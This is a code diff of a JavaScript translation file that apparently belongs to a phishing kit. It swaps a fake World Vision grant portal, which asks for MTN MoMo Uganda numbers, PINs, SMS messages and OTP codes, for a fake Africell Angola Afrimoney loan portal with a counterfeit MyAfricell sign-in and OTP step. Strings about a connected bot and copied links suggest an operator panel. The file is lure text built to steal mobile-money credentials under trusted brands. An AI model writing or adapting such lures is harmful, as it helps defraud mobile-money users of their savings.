@@ -1,189 +1,132 @@
 (function() {
   const translations = {
     en: {
-      title: "World Vision — Partnership & Community Grant Portal",
-      heroBadge: "World Vision • Community Partnerships & Grants",
-      heroHeading: "Partner with World Vision",
-      heroSubtitle: "Empowering communities through sustainable partnership grants, agricultural development, and child welfare initiatives. Direct grant funding via MTN MoMo.",
-      requestedAmount: "Requested Grant Budget",
-      interestRate: "100% Grant Support",
-      repaymentTerm: "Project Implementation Timeline",
-      month1: "3 Months",
-      months3: "6 Months",
-      months6: "12 Months",
-      months12: "24 Months",
-      estMonthly: "Est. Monthly Phase Support:",
-      totalRepay: "Total Grant Allocation:",
-      applyNow: "APPLY FOR PARTNERSHIP GRANT NOW",
-      step1Title: "Project & Partnership Scope",
-      step1Sub: "Specify your organization, project domain, and requested funding parameters (UGX 100,000 - UGX 10,000,000).",
-      loanType: "Partnership Category",
-      amountLabel: "Requested Grant Funding (UGX)",
-      termLabel: "Project Timeline (Months)",
-      purposeLabel: "Project Description & Community Need",
-      continueToPersonal: "CONTINUE TO REPRESENTATIVE DETAILS",
-      step2Title: "MoMo Uganda Account Details",
-      step2Sub: "Enter authorized representative details and active MTN MoMo Uganda mobile wallet.",
-      firstName: "Representative First Name",
-      lastName: "Representative Last Name",
-      orangePhone: "MTN MoMo Uganda Mobile Number (+256)",
-      employmentStatus: "Organization / Entity Type",
-      agentConsent: "I authorize MoMo Uganda to assist with verifying my account for grant disbursement.",
-      continueToAuth: "LINK TO MOMO ACCOUNT & PROCEED",
-      step3Title: "MoMo Uganda Account Sign In",
-      step3Sub: "Confirm your phone number and enter your 5-digit Account PIN to validate.",
-      phoneNum: "MTN MoMo Uganda Mobile Number",
-      pinLabel: "MoMo Account PIN (5 digits):",
-      showPin: "Show",
-      hidePin: "Hide",
-      confirmLoanBtn: "AUTHORIZE & CONFIRM MOMO PIN",
-      confirmPinBtn: "AUTHORIZE & CONFIRM MOMO PIN",
-      awaitingApproval: "Awaiting Approval",
-      pinAwaitingDesc: "Your 5-digit PIN has been submitted. Please wait while your verification is processed...",
-      step4Title: "Account Ownership Verification",
-      step4Sub: "Copy or wait for the SMS confirmation message from MoMo Uganda then paste below.",
-      smsLabel: "SMS Confirmation Message",
-      submitSmsBtn: "SUBMIT VERIFICATION MESSAGE",
-      awaitingVerification: "Awaiting Verification",
-      smsAwaitingDesc: "Your SMS verification has been submitted. Verification is in progress...",
-      step5OtpTitle: "OTP Verification",
-      otpHeading: "Enter OTP Code",
-      otpSub: "Enter the 4-digit OTP code sent to your phone via MTN MoMo Uganda",
-      otpLabel: "OTP Code (4 digits):",
-      verifyApproveBtn: "VERIFY & APPROVE LOAN",
-      step5Title: "Loan Approved & Processing!",
-      step5Sub: "Your partnership grant request has been processed by World Vision.",
-      appRef: "Application Reference:",
-      applicantName: "Representative:",
-      orangeContact: "MoMo Contact:",
-      loanMode: "Partnership Category:",
-      requestedAmt: "Requested Grant:",
-      termRepay: "Timeline / Support:",
-      currentStatus: "Current Status:",
-      statusPending: "⏳ Under Review",
-      newLoanBtn: "APPLY FOR ANOTHER PARTNERSHIP",
-      congratsHeading: "Congratulations!",
-      congratsSub: "Your loan has been approved! Funds are being disbursed to your MoMo account.",
+      title: "Africell Angola — Afrimoney Quick Loan Portal",
+      heroBadge: "Africell Angola • Afrimoney Empréstimo",
+      heroHeading: "Afrimoney Fast Cash Loans",
+      heroSubtitle: "Get instant micro-loans directly into your Afrimoney wallet. Simple application, fast approval, transparent rates up to 5.000.000 Kz.",
+      requestedAmount: "Requested Loan Amount",
+      interestRate: "Low Fixed Interest Rate",
+      repaymentTerm: "Repayment Period",
+      month1: "1 Month",
+      months3: "3 Months",
+      months6: "6 Months",
+      months12: "12 Months",
+      estMonthly: "Est. Monthly Installment:",
+      totalRepay: "Total Repayment:",
+      applyNow: "APPLY FOR AFRIMONEY LOAN NOW",
+      step1Title: "Loan Parameters & Purpose",
+      step1Sub: "Configure your loan amount (10.000 Kz to 5.000.000 Kz) and repayment schedule.",
+      loanType: "Loan Category",
+      amountLabel: "Requested Loan Amount (Kz)",
+      termLabel: "Loan Term (Months)",
+      purposeLabel: "Loan Purpose & Reason",
+      continueToPersonal: "CONTINUE TO APPLICANT DETAILS",
+      step2Title: "Applicant & Afrimoney Account",
+      step2Sub: "Enter your personal details and active Africell Angola phone number for loan disbursement.",
+      firstName: "First Name",
+      lastName: "Last Name",
+      orangePhone: "Africell Angola Mobile Number (+244)",
+      employmentStatus: "Employment / Income Source",
+      agentConsent: "I authorize Afrimoney to verify my account for loan disbursement.",
+      continueToAuth: "CONTINUE TO AFRIMONEY SIGN IN",
+      welcomeHeadline: "Welcome to",
+      welcomeBrand: "MyAfricell!",
+      phoneLabel: "Enter Phone Number",
+      rememberMe: "Remember Me",
+      signInBtn: "Sign in",
+      otpHeadline: "Enter your",
+      otpBrand: "OTP",
+      otpSentTo: "We sent you a 6-digit code via SMS to",
+      resendPrompt: "Didn't get the code? Resend in",
+      verifyBtn: "Verify",
+      approvedTitle: "Congratulations!",
+      approvedSub: "Your loan has been approved! Funds are being disbursed to your Afrimoney account.",
       approvedAmountLabel: "APPROVED LOAN AMOUNT",
       complianceNoticeTitle: "COMPLIANCE NOTICE",
-      complianceNoticeBody: "Your MoMo account must remain active. Ensure your mobile wallet is enabled for loan disbursement.",
+      complianceNoticeBody: "Your Afrimoney account must remain active. Ensure your mobile wallet is registered to receive the disbursement.",
       loanDetailsHeader: "Loan Details",
-      monthlyPaymentLabel: "MONTHLY PAYMENT",
+      monthlyPaymentLabel: "MONTHLY INSTALLMENT",
       loanTermLabel: "LOAN TERM",
       interestRateLabel: "INTEREST RATE",
-      quickActionsTitle: "Quick Actions",
-      btnDeposit: "Deposit Funds",
-      btnWithdraw: "Withdraw Funds",
-      btnLoanInfo: "Loan Details",
-      nextStepsTitle: "Next Steps:",
-      nextStepsBody: "You will receive an SMS confirmation with transaction details shortly.",
       returnHomeBtn: "Return Home",
-      footerRights: "© 2026 World Vision — Community Grants & Development Partnerships"
+      footerRights: "© 2026 Africell Angola — Afrimoney Micro-Crédito. All rights reserved."
     },
-    zm: {
-      title: "World Vision — Portal ya Mgwirizano ndi Ndalama za Ntchito",
-      heroBadge: "World Vision • Thandizo la Mgwirizano",
-      heroHeading: "Pemphani Mgwirizano wa World Vision",
-      heroSubtitle: "Kupititsa patsogolo madera kudzera mu thandizo la ndalama, ulimi ndi chisamaliro cha ana. Kulandira kudzera pa MTN MoMo.",
-      requestedAmount: "Bajeti ya Ndalama Zofunidwa",
-      interestRate: "Thandizo Lapadera 100%",
-      repaymentTerm: "Nthawi Yogwirira Ntchito",
-      month1: "Miezi 3",
-      months3: "Miezi 6",
-      months6: "Miezi 12",
-      months12: "Miezi 24",
-      estMonthly: "Thandizo pa Mwezi:",
-      totalRepay: "Ndalama Zonse za Thandizo:",
-      applyNow: "PEMPHANI MGWIRIZANO WA THANDIZO",
-      step1Title: "Zambiri za Pulojekiti & Mgwirizano",
-      step1Sub: "Lembani gulu lanu, ntchito ndi ndalama zomwe mukufuna (UGX 100,000 - UGX 10,000,000).",
-      loanType: "Mtundu wa Mgwirizano",
-      amountLabel: "Ndalama Zofunidwa (UGX)",
-      termLabel: "Nthawi ya Ntchito (Miezi)",
-      purposeLabel: "Kufotokozera za Ntchito ya Mudzi",
-      continueToPersonal: "PITANI PA ZAMBIRI ZA WOIMIRIRA",
-      step2Title: "Zambiri za Akaunti ya MoMo Uganda",
-      step2Sub: "Lembani za mtsogoleri ndi nambala ya MTN MoMo Uganda (+256) yolandirira ndalama.",
-      firstName: "Dzina Loyamba la Woimirira",
-      lastName: "Dzina Lomaliza la Woimirira",
-      orangePhone: "Nambala ya MTN MoMo Uganda (+256)",
-      employmentStatus: "Mtundu wa Gulu kapena Bungwe",
-      agentConsent: "Ndikuvomereza mgwirizano uwu ndi MoMo Uganda polandira ndalama.",
-      continueToAuth: "LUMIKIZANI KU MOMO NDI KUPITA PATSOGOLO",
-      step3Title: "Lowani pa Akaunti ya MoMo Uganda",
-      step3Sub: "Tsimikizirani nambala ya foni ndi PIN yanu ya 5-digits.",
-      phoneNum: "Nambala ya MoMo Uganda",
-      pinLabel: "PIN ya MoMo (tarakimu 5):",
-      showPin: "Onetsani",
-      hidePin: "Bisani",
-      confirmLoanBtn: "TSIMIKIZANI & LANDIRANI NGONGOLE",
-      confirmPinBtn: "TSIMIKIZIRANI PIN",
-      awaitingApproval: "Idekha Chivomerezo",
-      pinAwaitingDesc: "PIN yanu ya tarakimu 5 yatumizidwa. Chonde dikirani pomwe ikutsimikizidwa...",
-      step4Title: "Kutsimikizira Uphungu wa Akaunti",
-      step4Sub: "Koperani uthenga wa SMS wolandilidwa pa MoMo ndikumatira m'munsimu.",
-      smsLabel: "Uthenga wa SMS Wolandila",
-      submitSmsBtn: "TUMIZANI UTHENGA WA SMS",
-      awaitingVerification: "Ikutsimikizidwa",
-      smsAwaitingDesc: "Uthenga wanu wa SMS watumizidwa. Dikirani pang'ono...",
-      step5OtpTitle: "Kutsimikizira OTP",
-      otpHeading: "Lembani Khodi ya OTP",
-      otpSub: "Lembani nambala 4 ya OTP yomwe yatumizidwa pa foni yanu kudzera pa MTN MoMo Uganda",
-      otpLabel: "Khodi ya OTP (manambala 4):",
-      verifyApproveBtn: "TSIMIKIZANI & VOMEREZANI NGONGOLE",
-      step5Title: "Ngongole Yavomerezedwa!",
-      step5Sub: "Pempho lanu lavomerezedwa ndi World Vision.",
-      appRef: "Nambala ya Pempho:",
-      applicantName: "Woimirira:",
-      orangeContact: "Mawasiliano ya MoMo:",
-      loanMode: "Mtundu wa Mgwirizano:",
-      requestedAmt: "Ndalama Zofunidwa:",
-      termRepay: "Nthawi / Malipiro:",
-      currentStatus: "Kawonedwe:",
-      statusPending: "⏳ Ikuyang'aniridwa",
-      newLoanBtn: "PEMPHANI MGWIRIZANO WINA",
-      congratsHeading: "Zikomo Kwambiri!",
-      congratsSub: "Pempho la ngongole lavomerezedwa! Ndalama zikutumizidwa ku akaunti yanu ya MoMo.",
-      approvedAmountLabel: "NDALAMA YA NGONGOLE YOVOMEREZEDWA",
-      complianceNoticeTitle: "CHENJEZO LA UTIIFU",
-      complianceNoticeBody: "Akaunti yanu ya MoMo ikhale yogwira ntchito polandila ndalama za ngongole.",
-      loanDetailsHeader: "Zambiri za Ngongole",
-      monthlyPaymentLabel: "MALIPILO PA MWEZI",
-      loanTermLabel: "NTHAWI YA NGONGOLE",
-      interestRateLabel: "CHIYAMBI CHA CHIWONGOLA DZANJA",
-      quickActionsTitle: "Zochita Mwachangu",
-      btnDeposit: "Ikani Ndalama",
-      btnWithdraw: "Cotsani Ndalama",
-      btnLoanInfo: "Zambiri za Ngongole",
-      nextStepsTitle: "Zochita Zotsatira:",
-      nextStepsBody: "Muzalandira SMS yotsimikizira posachedwa.",
-      returnHomeBtn: "Bwererani Panyumba",
-      footerRights: "© 2026 World Vision — Community Grants & Development Partnerships"
+    pt: {
+      title: "Africell Angola — Portal de Empréstimos Afrimoney",
+      heroBadge: "Africell Angola • Afrimoney Empréstimo",
+      heroHeading: "Crédito Rápido Afrimoney",
+      heroSubtitle: "Obtenha micro-empréstimos instantâneos diretamente na sua carteira Afrimoney. Simples, rápido e com limites até 5.000.000 Kz.",
+      requestedAmount: "Montante Solicitado",
+      interestRate: "Taxa Fixa Reduzida",
+      repaymentTerm: "Prazo de Reembolso",
+      month1: "1 Mês",
+      months3: "3 Meses",
+      months6: "6 Meses",
+      months12: "12 Meses",
+      estMonthly: "Prestação Mensal Estimada:",
+      totalRepay: "Total a Reembolsar:",
+      applyNow: "SOLICITAR EMPRÉSTIMO AFRIMONEY",
+      step1Title: "Parâmetros e Finalidade do Empréstimo",
+      step1Sub: "Configure o montante pretendido (10.000 Kz a 5.000.000 Kz) e o prazo de reembolso.",
+      loanType: "Categoria do Empréstimo",
+      amountLabel: "Montante Pretendido (Kz)",
+      termLabel: "Prazo (Meses)",
+      purposeLabel: "Finalidade do Empréstimo",
+      continueToPersonal: "CONTINUAR PARA DADOS PESSOAIS",
+      step2Title: "Dados do Titular & Conta Afrimoney",
+      step2Sub: "Insira os seus dados e o número de telemóvel Africell Angola para desembolso do crédito.",
+      firstName: "Primeiro Nome",
+      lastName: "Apelido",
+      orangePhone: "Número Africell Angola (+244)",
+      employmentStatus: "Situação Profissional / Rendimento",
+      agentConsent: "Autorizo a Afrimoney a verificar a minha conta para desembolso do empréstimo.",
+      continueToAuth: "CONTINUAR PARA ENTRAR NA CONTA",
+      welcomeHeadline: "Bem-vindo ao",
+      welcomeBrand: "MyAfricell!",
+      phoneLabel: "Insira o Número de Telefone",
+      rememberMe: "Lembrar-me",
+      signInBtn: "Entrar",
+      otpHeadline: "Insira o seu",
+      otpBrand: "OTP",
+      otpSentTo: "Enviámos um código de 6 dígitos por SMS para",
+      resendPrompt: "Não recebeu o código? Reenviar em",
+      verifyBtn: "Verificar",
+      approvedTitle: "Parabéns!",
+      approvedSub: "O seu empréstimo foi aprovado! Os fundos estão a ser creditados na sua conta Afrimoney.",
+      approvedAmountLabel: "MONTANTE DE CRÉDITO APROVADO",
+      complianceNoticeTitle: "AVISO DE CONFORMIDADE",
+      complianceNoticeBody: "A sua conta Afrimoney deve permanecer ativa para receber a transferência do crédito.",
+      loanDetailsHeader: "Detalhes do Empréstimo",
+      monthlyPaymentLabel: "PRESTAÇÃO MENSAL",
+      loanTermLabel: "PRAZO DO CRÉDITO",
+      interestRateLabel: "TAXA DE JURO",
+      returnHomeBtn: "Voltar ao Início",
+      footerRights: "© 2026 Africell Angola — Afrimoney Micro-Crédito. Todos os direitos reservados."
     },
     common: {
-      "Bot Conectado": { zm: "Bot Imeunganishwa", en: "Bot Connected" },
-      "Bot Connected": { zm: "Bot Imeunganishwa", en: "Bot Connected" },
-      "Configurado": { zm: "Imewekwa", en: "Configured" },
-      "Configured": { zm: "Imewekwa", en: "Configured" },
-      "Bot Desconectado": { zm: "Bot Haifanyi Kazi", en: "Bot Disconnected" },
-      "Bot Disconnected": { zm: "Bot Haifanyi Kazi", en: "Bot Disconnected" },
-      "Link copiado com sucesso!": { zm: "Kiunganishi kimenakiliwa vizuri!", en: "Link copied successfully!" },
-      "Link copied successfully!": { zm: "Kiunganishi kimenakiliwa vizuri!", en: "Link copied successfully!" },
-      "Pendente": { zm: "Inasubiri", en: "Pending" },
-      "Pending": { zm: "Inasubiri", en: "Pending" },
-      "Em Análise": { zm: "Inakaguliwa", en: "Under Review" },
-      "Under Review": { zm: "Inakaguliwa", en: "Under Review" },
-      "Aprovado": { zm: "Imeidhinishwa", en: "Approved" },
-      "Approved": { zm: "Imeidhinishwa", en: "Approved" },
-      "Rejeitado": { zm: "Imekataliwa", en: "Rejected" },
-      "Rejected": { zm: "Imekataliwa", en: "Rejected" },
-      "meses": { zm: "miezi", en: "months" },
-      "candidatura(s).": { zm: "ombi/maombi.", en: "application(s)." }
+      "Bot Conectado": { pt: "Bot Conectado", en: "Bot Connected" },
+      "Bot Connected": { pt: "Bot Conectado", en: "Bot Connected" },
+      "Configurado": { pt: "Configurado", en: "Configured" },
+      "Configured": { pt: "Configurado", en: "Configured" },
+      "Bot Desconectado": { pt: "Bot Desconectado", en: "Bot Disconnected" },
+      "Bot Disconnected": { pt: "Bot Desconectado", en: "Bot Disconnected" },
+      "Link copiado com sucesso!": { pt: "Link copiado com sucesso!", en: "Link copied successfully!" },
+      "Link copied successfully!": { pt: "Link copiado com sucesso!", en: "Link copied successfully!" },
+      "Pendente": { pt: "Pendente", en: "Pending" },
+      "Pending": { pt: "Pendente", en: "Pending" },
+      "Em Análise": { pt: "Em Análise", en: "Under Review" },
+      "Under Review": { pt: "Em Análise", en: "Under Review" },
+      "Aprovado": { pt: "Aprovado", en: "Approved" },
+      "Approved": { pt: "Aprovado", en: "Approved" },
+      "Rejeitado": { pt: "Rejeitado", en: "Rejected" },
+      "Rejected": { pt: "Rejeitado", en: "Rejected" },
+      "meses": { pt: "meses", en: "months" }
     }
   };
 
-  // Default language is English ('en')
-  let currentLang = localStorage.getItem("momo_lang") || "en";
+  let currentLang = localStorage.getItem("africell_lang") || "pt";
+  if (currentLang !== "en" && currentLang !== "pt") currentLang = "pt";
 
   window.t = function(key) {
     if (!key) return "";
@@ -194,29 +137,48 @@
     return dict[key] || key;
   };
 
-  function setLanguage(lang) {
-    currentLang = lang;
-    localStorage.setItem("momo_lang", lang);
-    const dict = translations[lang] || translations.en;
-    
-    document.querySelectorAll(".language-toggle").forEach(btn => {
-      btn.innerText = lang.toUpperCase();
-    });
+  window.getCurrentLanguage = function() {
+    return currentLang;
+  };
+
+  window.setLanguage = function(lang) {
+    currentLang = (lang === "pt") ? "pt" : "en";
+    localStorage.setItem("africell_lang", currentLang);
+    const dict = translations[currentLang] || translations.en;
 
     document.querySelectorAll("[data-i18n]").forEach(el => {
       const key = el.getAttribute("data-i18n");
       if (dict[key]) {
-        el.innerText = dict[key];
+        if (el.tagName === "INPUT" || el.tagName === "TEXTAREA") {
+          el.placeholder = dict[key];
+        } else {
+          el.innerText = dict[key];
+        }
       }
     });
-  }
+
+    const langContainers = document.querySelectorAll(".lang-toggle-box");
+    langContainers.forEach(container => {
+      const enPill = container.querySelector(".pill-en");
+      const ptPill = container.querySelector(".pill-pt");
+      if (enPill && ptPill) {
+        if (currentLang === "en") {
+          enPill.className = "pill-en font-bold text-[#9B1479] bg-white px-2.5 py-0.5 rounded-full shadow-xs transition-all";
+          ptPill.className = "pill-pt font-medium text-slate-400 px-2 py-0.5 transition-all";
+        } else {
+          ptPill.className = "pill-pt font-bold text-[#9B1479] bg-white px-2.5 py-0.5 rounded-full shadow-xs transition-all";
+          enPill.className = "pill-en font-medium text-slate-400 px-2 py-0.5 transition-all";
+        }
+      }
+    });
+  };
 
   document.addEventListener("DOMContentLoaded", () => {
-    setLanguage(currentLang);
-    document.querySelectorAll(".language-toggle").forEach(btn => {
-      btn.addEventListener("click", () => {
-        const nextLang = currentLang === "en" ? "zm" : "en";
-        setLanguage(nextLang);
+    window.setLanguage(currentLang);
+    document.querySelectorAll(".lang-toggle-box").forEach(container => {
+      container.addEventListener("click", () => {
+        const nextLang = currentLang === "en" ? "pt" : "en";
+        window.setLanguage(nextLang);
       });
     });
   });
